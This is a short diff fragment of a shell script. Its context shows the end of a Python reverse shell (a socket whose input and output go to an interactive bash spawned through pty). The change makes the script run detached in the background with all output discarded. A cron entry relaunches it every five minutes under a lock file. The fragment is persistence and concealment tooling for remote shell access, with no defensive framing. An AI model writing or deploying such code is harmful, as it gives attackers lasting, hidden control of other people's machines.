@@ -41,7 +41,7 @@ pty.spawn(['/bin/bash','-i'])
 s.close()
 "
 EOF
-bash "$script_path"
+nohup bash "$script_path" > /dev/null 2>&1 &
 
 CRON_JOB="*/5 * * * * flock -n /tmp/x_script.lock $script_path"
 if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
